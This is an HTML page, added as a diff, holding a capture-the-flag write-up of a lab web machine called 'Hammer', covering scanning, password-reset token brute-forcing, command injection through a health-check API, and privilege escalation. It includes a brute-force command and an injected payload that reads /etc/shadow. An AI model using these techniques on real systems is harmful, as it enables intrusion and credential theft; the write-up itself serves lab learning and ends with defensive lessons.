@@ -1,0 +1,116 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Hammer — Writeup</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+  <!-- Loader overlay (CLI style) -->
+  <div id="loader-overlay">
+    <div class="loader-cli">
+      <div class="loader-cli-line"><span id="loader-cli-bar"></span></div>
+      <div class="loader-cli-line" id="loader-cli-label">[sudo] updating & upgrading...</div>
+      <div class="loader-cli-phrase" id="loader-phrase">Initializing...</div>
+    </div>
+  </div>
+  <div class="bg-video-wrapper" aria-hidden="true">
+    <video id="bgVideoWriteup" class="bg-video" autoplay muted loop playsinline preload="auto">
+      <source src="../assets/videos/projects_background.mp4" type="video/mp4">
+    </video>
+    <div class="bg-overlay-glass"></div>
+  </div>
+
+  <nav id="site-navbar" class="navbar navbar-expand-lg navbar-dark bg-transparent px-4">
+    <div class="container-fluid">
+      <a class="navbar-brand autograph autograph-painter p-0" href="../index.html">xorxorplain</a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navMenu">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navMenu">
+        <ul class="navbar-nav ms-auto">
+          <li class="nav-item"><a class="nav-link" href="../index.html">Home</a></li>
+          <li class="nav-item"><a class="nav-link" href="../about.html">About</a></li>
+          <li class="nav-item"><a class="nav-link active" href="projects.html">Projects</a></li>
+          <li class="nav-item"><a class="nav-link" href="../blog/index.html">Blog</a></li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <main class="writeup-page">
+    <div class="writeup-container glass-content">
+      <a href="projects.html" class="writeup-back" aria-label="Back to projects">
+        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 -960 960 960" fill="currentColor"><path d="M480-160 160-480l320-320 56 56-224 224h488v80H312l224 224-56 56Z"/></svg>
+        <span>Projects</span>
+      </a>
+
+      <header class="writeup-header">
+        <div class="writeup-meta">
+          <span class="writeup-badge writeup-badge--intermediate">Intermediate</span>
+          <span class="writeup-env">Web</span>
+          <span class="writeup-date">21/02/2026</span>
+        </div>
+        <h1 class="writeup-title">Hammer</h1>
+      </header>
+
+      <hr class="writeup-divider">
+
+      <article class="writeup-body">
+        <h2>Overview</h2>
+        <p>Hammer is an intermediate-difficulty web-focused machine. It presents a modern web application with multiple layers of authentication bypass and API abuse leading to full compromise.</p>
+
+        <h2>Reconnaissance</h2>
+        <h3>Nmap Scan</h3>
+        <pre><code>$ nmap -sC -sV -oN nmap/hammer 10.10.11.xx
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Apache/2.4.54
+443/tcp open  ssl     Apache/2.4.54
+8080/tcp open http    Jetty 9.4.48</code></pre>
+        <p>The box runs Apache with HTTPS on the standard ports and a Jetty application server on 8080.</p>
+
+        <h3>Directory Enumeration</h3>
+        <pre><code>$ feroxbuster -u https://10.10.11.xx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+200  GET  /api/v1/
+200  GET  /api/v1/docs
+302  GET  /admin → /login
+200  GET  /static/js/app.js</code></pre>
+        <p>The API documentation endpoint at <code>/api/v1/docs</code> reveals the full REST API schema including authentication endpoints.</p>
+
+        <h2>Exploitation</h2>
+        <h3>Authentication Bypass</h3>
+        <p>The password reset flow uses a predictable 4-digit token sent via email. By brute-forcing the token within the rate limit window:</p>
+        <pre><code>$ python3 brute_reset.py --target https://10.10.11.xx \
+  --user admin@hammer.htb --range 0000-9999 --threads 20</code></pre>
+
+        <h3>API Abuse</h3>
+        <p>Once authenticated, the API exposes an endpoint for executing "health checks" that accepts arbitrary commands via the <code>cmd</code> parameter:</p>
+        <pre><code>POST /api/v1/health HTTP/1.1
+Authorization: Bearer eyJ...
+Content-Type: application/json
+
+{"cmd": "id; cat /etc/shadow"}</code></pre>
+
+        <h3>Privilege Escalation</h3>
+        <p>The web application runs as a service user. Examining the Jetty configuration reveals credentials for the management interface on port 8080, which runs as root.</p>
+
+        <h2>Flags</h2>
+        <ul>
+          <li><strong>User:</strong> <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></li>
+          <li><strong>Root:</strong> <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></li>
+        </ul>
+
+        <h2>Lessons Learned</h2>
+        <p>Rate limiting must be enforced on authentication and password reset flows. API endpoints should never accept raw system commands, and management interfaces must be properly isolated.</p>
+      </article>
+    </div>
+  </main>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="../assets/js/title-glitch.js"></script>
+  <script src="../assets/js/loader.js"></script>
+</body>
+</html>
